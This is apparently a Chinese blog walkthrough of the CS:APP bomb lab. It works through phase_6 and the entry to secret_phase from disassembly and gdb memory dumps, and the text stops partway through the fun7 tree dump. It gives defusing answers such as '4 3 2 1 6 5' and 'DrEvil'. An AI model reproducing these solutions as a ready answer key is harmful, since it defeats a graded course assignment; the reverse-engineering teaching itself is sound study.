<p>开始是一系列赋值操作，eax中的值是rsp位置存放的值。第6、7两行将eax中的值减一后与5进行比较，小于等于5则跳过引爆代码。也就是说rsp中存放的第一个数必须小于等于6。<br>接下来执行两层循环，外循环由r12d控制循环次数，%r13指定元素位置，内循环由ebx指定索引，所有值之间进行两两比较，并将所有值与6比较。由此可知，读入的6个数必须小于等于6且互不相等。<br>上述循环结束后r12d等于6，跳转至以下位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">401153</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">74</span> <span class="number">24</span> <span class="number">18</span>       	lea    <span class="number">0x18</span>(%rsp),%rsi</span><br><span class="line"><span class="number">401158</span>:	<span class="number">4</span>c <span class="number">89</span> f0             	mov    %r14,%rax</span><br><span class="line"><span class="number">40115b</span>:	b9 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x7</span>,%ecx</span><br><span class="line"><span class="number">401160</span>:	<span class="number">89</span> ca                	mov    %ecx,%edx</span><br><span class="line"><span class="number">401162</span>:	<span class="number">2b</span> <span class="number">10</span>                	sub    (%rax),%edx</span><br><span class="line"><span class="number">401164</span>:	<span class="number">89</span> <span class="number">10</span>                	mov    %edx,(%rax)</span><br><span class="line"><span class="number">401166</span>:	<span class="number">48</span> <span class="number">83</span> c0 <span class="number">04</span>          	add    $<span class="number">0x4</span>,%rax</span><br><span class="line"><span class="number">40116</span>a:	<span class="number">48</span> <span class="number">39</span> f0             	cmp    %rsi,%rax</span><br><span class="line"><span class="number">40116</span>d:	<span class="number">75</span> f1                	jne    <span class="number">401160</span> &lt;phase_6+<span class="number">0x6c</span>&gt;</span><br></pre></td></tr></table></figure>
<p>将r14的值赋给rax，r14的值是之前保存的rsp。这段代码将栈中的6个值（假设为x）变为7-x再存储回栈中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">40116f</span>:	be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%esi</span><br><span class="line"><span class="number">401174</span>:	eb <span class="number">21</span>                	jmp    <span class="number">401197</span> &lt;phase_6+<span class="number">0xa3</span>&gt;</span><br><span class="line"><span class="number">401176</span>:	<span class="number">48</span> <span class="number">8b</span> <span class="number">52</span> <span class="number">08</span>          	mov    <span class="number">0x8</span>(%rdx),%rdx</span><br><span class="line"><span class="number">40117</span>a:	<span class="number">83</span> c0 <span class="number">01</span>             	add    $<span class="number">0x1</span>,%eax</span><br><span class="line"><span class="number">40117</span>d:	<span class="number">39</span> c8                	cmp    %ecx,%eax</span><br><span class="line"><span class="number">40117f</span>:	<span class="number">75</span> f5                	jne    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;</span><br><span class="line"><span class="number">401181</span>:	eb <span class="number">05</span>                	jmp    <span class="number">401188</span> &lt;phase_6+<span class="number">0x94</span>&gt;</span><br><span class="line"><span class="number">401183</span>:	ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>       	mov    $<span class="number">0x6032d0</span>,%edx</span><br><span class="line"></span><br><span class="line"><span class="number">401188</span>:	<span class="number">48</span> <span class="number">89</span> <span class="number">54</span> <span class="number">74</span> <span class="number">20</span>       	mov    %rdx,<span class="number">0x20</span>(%rsp,%rsi,<span class="number">2</span>)</span><br><span class="line"><span class="number">40118</span>d:	<span class="number">48</span> <span class="number">83</span> c6 <span class="number">04</span>          	add    $<span class="number">0x4</span>,%rsi</span><br><span class="line"><span class="number">401191</span>:	<span class="number">48</span> <span class="number">83</span> fe <span class="number">18</span>          	cmp    $<span class="number">0x18</span>,%rsi</span><br><span class="line"><span class="number">401195</span>:	<span class="number">74</span> <span class="number">14</span>                	je     <span class="number">4011</span>ab &lt;phase_6+<span class="number">0xb7</span>&gt;</span><br><span class="line"><span class="number">401197</span>:	<span class="number">8b</span> <span class="number">0</span>c <span class="number">34</span>             	mov    (%rsp,%rsi,<span class="number">1</span>),%ecx</span><br><span class="line"><span class="number">40119</span>a:	<span class="number">83</span> f9 <span class="number">01</span>             	cmp    $<span class="number">0x1</span>,%ecx</span><br><span class="line"><span class="number">40119</span>d:	<span class="number">7</span>e e4                	jle    <span class="number">401183</span> &lt;phase_6+<span class="number">0x8f</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">40119f</span>:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line"><span class="number">4011</span>a4:	ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>       	mov    $<span class="number">0x6032d0</span>,%edx</span><br><span class="line"><span class="number">4011</span>a9:	eb cb                	jmp    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;</span><br></pre></td></tr></table></figure>
<p>将rsp+rsi处的数赋给ecx，接下来根据ecx与1的相对大小进行跳转</p>
<ul>
<li> 若小于等于1，将立即数0x6032d0赋值给ecx,接下来将edx的值赋给了rsp+2*rsi+0x20的地址指向的值。rsi为地址偏移量索引，下面一行将rsi增加4，说明从rsp+0x20开始存放8个字节的数据。再将rsi的值与0x18作比较，说明整个过程要进行6次。接下来又到了第14行将下一个int值给rcx。</li>
<li> 若大于1，将0x1赋给eax，19行将0x6032d0这个地址赋给edx，接下来跳转到了第3行，把edx+0x8地址指向的值赋给了edx，<mark class="label default">x/12xg 0x6032d0</mark>查看rbx处的值，如下所示： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x6032d0</span> &lt;node1&gt;:       <span class="number">0x000000010000014c</span>      <span class="number">0x00000000006032e0</span></span><br><span class="line"><span class="number">0x6032e0</span> &lt;node2&gt;:       <span class="number">0x00000002000000a8</span>      <span class="number">0x00000000006032f0</span></span><br><span class="line"><span class="number">0x6032f0</span> &lt;node3&gt;:       <span class="number">0x000000030000039c</span>      <span class="number">0x0000000000603300</span></span><br><span class="line"><span class="number">0x603300</span> &lt;node4&gt;:       <span class="number">0x00000004000002b3</span>      <span class="number">0x0000000000603310</span></span><br><span class="line"><span class="number">0x603310</span> &lt;node5&gt;:       <span class="number">0x00000005000001dd</span>      <span class="number">0x0000000000603320</span></span><br><span class="line"><span class="number">0x603320</span> &lt;node6&gt;:       <span class="number">0x00000006000001bb</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
观察可以发现此为一链表结构，每一个node中偏移8个字节中储存的都是下一个节点的地址，那么前面8个字节自然就是节点储存的数据。可知，把edx+0x8地址指向的值赋给了edx，和链表中<mark class="label p=p->next"></mark>操作一致。<br>之后依次从栈中读取存放的6个数放入rcx，再根据rcx的值找到链表中对应的节点，把节点的地址放入rsp+0x20开始的对应位置中。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4011</span>ab:	<span class="number">48</span> <span class="number">8b</span> <span class="number">5</span>c <span class="number">24</span> <span class="number">20</span>       	mov    <span class="number">0x20</span>(%rsp),%rbx</span><br><span class="line">  <span class="number">4011b</span>0:	<span class="number">48</span> <span class="number">8</span>d <span class="number">44</span> <span class="number">24</span> <span class="number">28</span>       	lea    <span class="number">0x28</span>(%rsp),%rax</span><br><span class="line">  <span class="number">4011b</span>5:	<span class="number">48</span> <span class="number">8</span>d <span class="number">74</span> <span class="number">24</span> <span class="number">50</span>       	lea    <span class="number">0x50</span>(%rsp),%rsi</span><br><span class="line">  <span class="number">4011b</span>a:	<span class="number">48</span> <span class="number">89</span> d9             	mov    %rbx,%rcx</span><br><span class="line">  <span class="number">4011b</span>d:	<span class="number">48</span> <span class="number">8b</span> <span class="number">10</span>             	mov    (%rax),%rdx</span><br><span class="line">  <span class="number">4011</span>c0:	<span class="number">48</span> <span class="number">89</span> <span class="number">51</span> <span class="number">08</span>          	mov    %rdx,<span class="number">0x8</span>(%rcx)</span><br><span class="line">  <span class="number">4011</span>c4:	<span class="number">48</span> <span class="number">83</span> c0 <span class="number">08</span>          	add    $<span class="number">0x8</span>,%rax</span><br><span class="line">  <span class="number">4011</span>c8:	<span class="number">48</span> <span class="number">39</span> f0             	cmp    %rsi,%rax</span><br><span class="line">  <span class="number">4011</span>cb:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">4011</span>d2 &lt;phase_6+<span class="number">0xde</span>&gt;</span><br><span class="line">  <span class="number">4011</span>cd:	<span class="number">48</span> <span class="number">89</span> d1             	mov    %rdx,%rcx</span><br><span class="line">  <span class="number">4011</span>d0:	eb eb                	jmp    <span class="number">4011b</span>d &lt;phase_6+<span class="number">0xc9</span>&gt;</span><br><span class="line">  <span class="number">4011</span>d2:	<span class="number">48</span> c7 <span class="number">42</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	movq   $<span class="number">0x0</span>,<span class="number">0x8</span>(%rdx)</span><br></pre></td></tr></table></figure>
这段代码前三行分别将rsp+0x20地址指向值、rsp+0x28的值、rsp+0x50的值赋给了rbx 、rax、rsi。第4行将rbx复制到rcx中，第5行将rax（rsp+0x20）中存放的地址复制入rdx，第6行将这个数据赋给了rcx（也就是rbx、*(rsp+0x20)）节点的指针域。下一步将rax增加8，指向栈中的下一个位置。再与rsi这个临界地址进行比较，如果rax超出末端则跳出这段代码到第12行的位置。</li>
</ul>
<p>下面把rdx中存放的地址值赋给rcx，跳转到第5行重复过程。</p>
<p>仔细分析，这个过程其实就是按照链表节点在栈中的位置重新将链表连接起来，最后跳出的第12行则是把新的表尾的指针域赋为NULL。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4011</span>d9:	<span class="number">00</span> </span><br><span class="line"><span class="number">4011</span>da:	bd <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x5</span>,%ebp</span><br><span class="line"><span class="number">4011</span>df:	<span class="number">48</span> <span class="number">8b</span> <span class="number">43</span> <span class="number">08</span>          	mov    <span class="number">0x8</span>(%rbx),%rax</span><br><span class="line"><span class="number">4011e3</span>:	<span class="number">8b</span> <span class="number">00</span>                	mov    (%rax),%eax</span><br><span class="line"><span class="number">4011e5</span>:	<span class="number">39</span> <span class="number">03</span>                	cmp    %eax,(%rbx)</span><br><span class="line"><span class="number">4011e7</span>:	<span class="number">7</span>d <span class="number">05</span>                	jge    <span class="number">4011</span>ee &lt;phase_6+<span class="number">0xfa</span>&gt;</span><br><span class="line"><span class="number">4011e9</span>:	e8 <span class="number">4</span>c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">4011</span>ee:	<span class="number">48</span> <span class="number">8b</span> <span class="number">5b</span> <span class="number">08</span>          	mov    <span class="number">0x8</span>(%rbx),%rbx</span><br><span class="line"><span class="number">4011f</span>2:	<span class="number">83</span> ed <span class="number">01</span>             	sub    $<span class="number">0x1</span>,%ebp</span><br><span class="line"><span class="number">4011f</span>5:	<span class="number">75</span> e8                	jne    <span class="number">4011</span>df &lt;phase_6+<span class="number">0xeb</span>&gt;</span><br><span class="line"><span class="number">4011f</span>7:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">50</span>          	add    $<span class="number">0x50</span>,%rsp</span><br><span class="line"><span class="number">4011f</span>b:	<span class="number">5b</span>                   	pop    %rbx</span><br><span class="line"><span class="number">4011f</span>c:	<span class="number">5</span>d                   	pop    %rbp</span><br><span class="line"><span class="number">4011f</span>d:	<span class="number">41</span> <span class="number">5</span>c                	pop    %r12</span><br><span class="line"><span class="number">4011f</span>f:	<span class="number">41</span> <span class="number">5</span>d                	pop    %r13</span><br><span class="line"><span class="number">401201</span>:	<span class="number">41</span> <span class="number">5</span>e                	pop    %r14</span><br><span class="line"><span class="number">401203</span>:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>把立即数0x5赋值给ebp，ebp将控制循环次数。rbx的值是之前的rsp+0x20，那么rbx+0x8这个地址中存放的值就是下一个节点的地址，赋给了rax。将rax代表的节点的数据低四字节取出放入eax，再与rbx代表的节点的数据的值的低4位进行比较，如果前一个节点的数据的低4字节大于等于后一个节点的，则不引爆炸弹。<br>数据由大到小的排列依次是3 4 5 6 1 2。<br>由于有一步x = 7 - x，所以倒推回来的答案应该是：<code>4 3 2 1 6 5</code></p>
<h1 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h1><p>至此，六个关卡我们均顺利通过，但是在phase_6之后还有<code>func7</code>和<code>secret_phase</code>,然而在func7中并没有调用secret_phase函数，通过全局查找我们在<code>phase_defused</code>中找到了调用该函数的入口，接下来我们分析一下如何进入<code>secret_phase</code>。<br>以下为<code>phase_defused</code>的汇编代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004015</span>c4 &lt;phase_defused&gt;:</span><br><span class="line">  <span class="number">4015</span>c4:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">78</span>          	sub    $<span class="number">0x78</span>,%rsp</span><br><span class="line">  <span class="number">4015</span>c8:	<span class="number">64</span> <span class="number">48</span> <span class="number">8b</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> 	mov    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">4015</span>cf:	<span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">4015</span>d1:	<span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">68</span>       	mov    %rax,<span class="number">0x68</span>(%rsp)</span><br><span class="line">  <span class="number">4015</span>d6:	<span class="number">31</span> c0                	<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">  <span class="number">4015</span>d8:	<span class="number">83</span> <span class="number">3</span>d <span class="number">81</span> <span class="number">21</span> <span class="number">20</span> <span class="number">00</span> <span class="number">06</span> 	cmpl   $<span class="number">0x6</span>,<span class="number">0x202181</span>(%rip)        # <span class="number">603760</span> &lt;num_input_strings&gt;</span><br><span class="line">  <span class="number">4015</span>df:	<span class="number">75</span> <span class="number">5</span>e                	jne    <span class="number">40163f</span> &lt;phase_defused+<span class="number">0x7b</span>&gt;</span><br><span class="line">  <span class="number">4015e1</span>:	<span class="number">4</span>c <span class="number">8</span>d <span class="number">44</span> <span class="number">24</span> <span class="number">10</span>       	lea    <span class="number">0x10</span>(%rsp),%r8</span><br><span class="line">  <span class="number">4015e6</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">0</span>c       	lea    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  <span class="number">4015</span>eb:	<span class="number">48</span> <span class="number">8</span>d <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>       	lea    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  <span class="number">4015f</span>0:	be <span class="number">19</span> <span class="number">26</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x402619</span>,%esi</span><br><span class="line">  <span class="number">4015f</span>5:	bf <span class="number">70</span> <span class="number">38</span> <span class="number">60</span> <span class="number">00</span>       	mov    $<span class="number">0x603870</span>,%edi</span><br><span class="line">  <span class="number">4015f</span>a:	e8 f1 f5 ff ff       	callq  <span class="number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  <span class="number">4015f</span>f:	<span class="number">83</span> f8 <span class="number">03</span>             	cmp    $<span class="number">0x3</span>,%eax</span><br><span class="line">  <span class="number">401602</span>:	<span class="number">75</span> <span class="number">31</span>                	jne    <span class="number">401635</span> &lt;phase_defused+<span class="number">0x71</span>&gt;</span><br><span class="line">  <span class="number">401604</span>:	be <span class="number">22</span> <span class="number">26</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x402622</span>,%esi</span><br><span class="line">  <span class="number">401609</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">7</span>c <span class="number">24</span> <span class="number">10</span>       	lea    <span class="number">0x10</span>(%rsp),%rdi</span><br><span class="line">  <span class="number">40160</span>e:	e8 <span class="number">25</span> fd ff ff       	callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">  <span class="number">401613</span>:	<span class="number">85</span> c0                	test   %eax,%eax</span><br><span class="line">  <span class="number">401615</span>:	<span class="number">75</span> <span class="number">1</span>e                	jne    <span class="number">401635</span> &lt;phase_defused+<span class="number">0x71</span>&gt;</span><br><span class="line">  <span class="number">401617</span>:	bf f8 <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x4024f8</span>,%edi</span><br><span class="line">  <span class="number">40161</span>c:	e8 ef f4 ff ff       	callq  <span class="number">400b</span>10 &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">401621</span>:	bf <span class="number">20</span> <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x402520</span>,%edi</span><br><span class="line">  <span class="number">401626</span>:	e8 e5 f4 ff ff       	callq  <span class="number">400b</span>10 &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">40162b</span>:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">401630</span>:	e8 <span class="number">0</span>d fc ff ff       	callq  <span class="number">401242</span> &lt;secret_phase&gt;</span><br><span class="line">  <span class="number">401635</span>:	bf <span class="number">58</span> <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x402558</span>,%edi</span><br><span class="line">  <span class="number">40163</span>a:	e8 d1 f4 ff ff       	callq  <span class="number">400b</span>10 &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">40163f</span>:	<span class="number">48</span> <span class="number">8b</span> <span class="number">44</span> <span class="number">24</span> <span class="number">68</span>       	mov    <span class="number">0x68</span>(%rsp),%rax</span><br><span class="line">  <span class="number">401644</span>:	<span class="number">64</span> <span class="number">48</span> <span class="number">33</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> 	<span class="keyword">xor</span>    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">40164b</span>:	<span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">40164</span>d:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">401654</span> &lt;phase_defused+<span class="number">0x90</span>&gt;</span><br><span class="line">  <span class="number">40164f</span>:	e8 dc f4 ff ff       	callq  <span class="number">400b</span>30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  <span class="number">401654</span>:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">78</span>          	add    $<span class="number">0x78</span>,%rsp</span><br><span class="line">  <span class="number">401658</span>:	c3                   	retq   </span><br><span class="line">  <span class="number">401659</span>:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">40165</span>a:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">40165b</span>:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">40165</span>c:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">40165</span>d:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">40165</span>e:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">40165f</span>:	<span class="number">90</span>                   	nop</span><br></pre></td></tr></table></figure>
<p>在第7行将输入字符串数目与6进行比较，如果不等于6则直接跳转至最后。也就是说通过前面六关以后并且炸弹没有爆炸就才会执行此后的代码。<br>在第12行和第13行分别将两个地址传给esi和edi,<code>x/s 0x402619</code>查看0x402619处的字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x402619:       &quot;%d %d %s&quot;</span><br></pre></td></tr></table></figure>
<p>输入格式为两个整数和一个字符串。<br>在12行之后又有一行给edi赋上了一个地址值，我们之前所有阶段中edi的值都是来自于我们read_line的地址，我们推测传入地址对应此前某一关卡我们所输入的内容，<mark class="label default">x/s 0x603870</mark>，显示如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x603870</span> &lt;input_strings+<span class="number">240</span>&gt;:   <span class="string">&quot;7 0&quot;</span></span><br></pre></td></tr></table></figure>
<p>符号表input_string验证了我们的想法，7 0即为第四关我们输入的内容。<br>第17-19行是对strings_not_equal的调用，我们已经知道它的两个参数分别是esi与edi，esi被赋上了一个地址值，edi被赋上了esp+0x10，我们可以推测出edi的地址就是指向我们读入的第三个字符串的，根据之前的经验，rsi中存储的应该是比较的字符串，我们在运行时输入<mark class="label default">x/s 0x402622</mark>查看内存的内容：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x402622</span>:       <span class="string">&quot;DrEvil&quot;</span></span><br></pre></td></tr></table></figure>
<p>顺利进入secret_phase关卡，secret_phase对应汇编代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:	53                   	push   %rbx</span><br><span class="line">  401243:	e8 56 02 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:	ba 0a 00 00 00       	mov    $0xa,%edx</span><br><span class="line">  40124d:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401252:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  401255:	e8 76 f9 ff ff       	callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  40125a:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax</span><br><span class="line">  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax</span><br><span class="line">  401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:	e8 ce 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:	89 de                	mov    %ebx,%esi</span><br><span class="line">  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi</span><br><span class="line">  401273:	e8 8c ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:	e8 b8 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:	bf 38 24 40 00       	mov    $0x402438,%edi</span><br><span class="line">  401287:	e8 84 f8 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:	e8 33 03 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:	5b                   	pop    %rbx</span><br><span class="line">  401292:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>第3行调用了read_line函数，读入一行，然后将返回结果赋值给rdi,之后调用了strtol函数，这个标准库函数的作用是把一个字符串转换成对应的长整型数值。第8行将rax赋值给rbx，第9行将rax减1赋给eax，第10行与0x3e8进行比较，如果这个值小于等于0x3e8就跳过引爆代码。由此可知，我们应该输入一行数据，数值小于等于1001。<br>接下来将ebx赋给了esi，也就是我们一开始输入的数据的值。第14行将一个地址值赋给了edi，15行调用了fun7函数。在调用返回后令rax与2作比较，如果相等则跳过引爆代码。<br>查看func7的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000401204</span> &lt;fun7&gt;:</span><br><span class="line">  <span class="number">401204</span>:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          	sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">401208</span>:	<span class="number">48</span> <span class="number">85</span> ff             	test   %rdi,%rdi</span><br><span class="line">  <span class="number">40120b</span>:	<span class="number">74</span> <span class="number">2b</span>                	je     <span class="number">401238</span> &lt;fun7+<span class="number">0x34</span>&gt;</span><br><span class="line">  <span class="number">40120</span>d:	<span class="number">8b</span> <span class="number">17</span>                	mov    (%rdi),%edx</span><br><span class="line">  <span class="number">40120f</span>:	<span class="number">39</span> f2                	cmp    %esi,%edx</span><br><span class="line">  <span class="number">401211</span>:	<span class="number">7</span>e <span class="number">0</span>d                	jle    <span class="number">401220</span> &lt;fun7+<span class="number">0x1c</span>&gt;</span><br><span class="line">  <span class="number">401213</span>:	<span class="number">48</span> <span class="number">8b</span> <span class="number">7f</span> <span class="number">08</span>          	mov    <span class="number">0x8</span>(%rdi),%rdi</span><br><span class="line">  <span class="number">401217</span>:	e8 e8 ff ff ff       	callq  <span class="number">401204</span> &lt;fun7&gt;</span><br><span class="line">  <span class="number">40121</span>c:	<span class="number">01</span> c0                	add    %eax,%eax</span><br><span class="line">  <span class="number">40121</span>e:	eb <span class="number">1</span>d                	jmp    <span class="number">40123</span>d &lt;fun7+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">401220</span>:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">401225</span>:	<span class="number">39</span> f2                	cmp    %esi,%edx</span><br><span class="line">  <span class="number">401227</span>:	<span class="number">74</span> <span class="number">14</span>                	je     <span class="number">40123</span>d &lt;fun7+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">401229</span>:	<span class="number">48</span> <span class="number">8b</span> <span class="number">7f</span> <span class="number">10</span>          	mov    <span class="number">0x10</span>(%rdi),%rdi</span><br><span class="line">  <span class="number">40122</span>d:	e8 d2 ff ff ff       	callq  <span class="number">401204</span> &lt;fun7&gt;</span><br><span class="line">  <span class="number">401232</span>:	<span class="number">8</span>d <span class="number">44</span> <span class="number">00</span> <span class="number">01</span>          	lea    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</span><br><span class="line">  <span class="number">401236</span>:	eb <span class="number">05</span>                	jmp    <span class="number">40123</span>d &lt;fun7+<span class="number">0x39</span>&gt;</span><br><span class="line">  <span class="number">401238</span>:	b8 ff ff ff ff       	mov    $<span class="number">0xffffffff</span>,%eax</span><br><span class="line">  <span class="number">40123</span>d:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>          	add    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">401241</span>:	c3                   	retq  </span><br></pre></td></tr></table></figure>
<p>3、4两行先对传入参数rdi进行判断，如果等于0直接跳到第19行，返回-1，我们想让函数返回2，显然不可以让rdi等于0</p>
<p>第5行将rdi的值读入到了edx中，第6行则将这个数与我们读入的数进行比较，如果这个数小于等于我们读入的数就跳至第12行，第12行将eax置0，再次比较esi和edx，如果相等则跳至第20行返回。</p>
<p>如果不等（也就是edx小于我们读入的数），则继续向下执行第15行，这行代码有些与之前的链表跳至下一个节点类似，到这里，我们就需要查看一下rdi这个地址里存放的是怎样一种数据结构：</p>
<mark class="label default">x/120a 0x6030f0</mark>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x6030f0</span> &lt;n1&gt;:  <span class="number">0x24</span>    <span class="number">0x603110</span> &lt;n21&gt;</span><br><span class="line"><span class="number">0x603100</span> &lt;n1+<span class="number">16</span>&gt;:   <span class="number">0x603130</span> &lt;n22&gt;  <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603110</span> &lt;n21&gt;: <span class="number">0x8</span> <span class="number">0x603190</span> &lt;n31&gt;</span><br><span class="line"><span class="number">0x603120</span> &lt;n21+<span class="number">16</span>&gt;:  <span class="number">0x603150</span> &lt;n32&gt;  <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603130</span> &lt;n22&gt;: <span class="number">0x32</span>    <span class="number">0x603170</span> &lt;n33&gt;</span><br><span class="line"><span class="number">0x603140</span> &lt;n22+<span class="number">16</span>&gt;:  <span class="number">0x6031b0</span> &lt;n34&gt;  <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603150</span> &lt;n32&gt;: <span class="number">0x16</span>    <span class="number">0x603270</span> &lt;n43&gt;</span><br><span class="line"><span class="number">0x603160</span> &lt;n32+<span class="number">16</span>&gt;:  <span class="number">0x603230</span> &lt;n44&gt;  <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603170</span> &lt;n33&gt;: <span class="number">0x2d</span>    <span class="number">0x6031d0</span> &lt;n45&gt;</span><br><span class="line"><span class="number">0x603180</span> &lt;n33+<span class="number">16</span>&gt;:  <span class="number">0x603290</span> &lt;n46&gt;  <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603190</span> &lt;n31&gt;: <span class="number">0x6</span> <span class="number">0x6031f0</span> &lt;n41&gt;</span><br><span class="line"><span class="number">0x6031a0</span> &lt;n31+<span class="number">16</span>&gt;:  <span class="number">0x603250</span> &lt;n42&gt;  <span class="number">0x0</span></span><br><span class="line"><span class="number">0x6031b0</span> &lt;n34&gt;: <span class="number">0x6b</span>    <span class="number">0x603210</span> &lt;n47&gt;</span><br><span class="line"><span class="number">0x6031c0</span> &lt;n34+<span class="number">16</span>&gt;:  <span class="number">0x6032b0</span> &lt;n48&gt;  <span class="number">0x0</span></span><br><span class="line"><span class="number">0x6031d0</span> &lt;n45&gt;: <span class="number">0x28</span>    <span class="number">0x0</span></span><br><span class="line"><span class="number">0x6031e0</span> &lt;n45+<span class="number">16</span>&gt;:  <span class="number">0x0</span> <span class="number">0x0</span></span><br><span class="line"><span class="number">0x6031f0</span> &lt;n41&gt;: <span class="number">0x1</span> <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603200</span> &lt;n41+<span class="number">16</span>&gt;:  <span class="number">0x0</span> <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603210</span> &lt;n47&gt;: <span class="number">0x63</span>    <span class="number">0x0</span></span><br><span class="line"><span class="number">0x603220</span> &lt;n47+<span 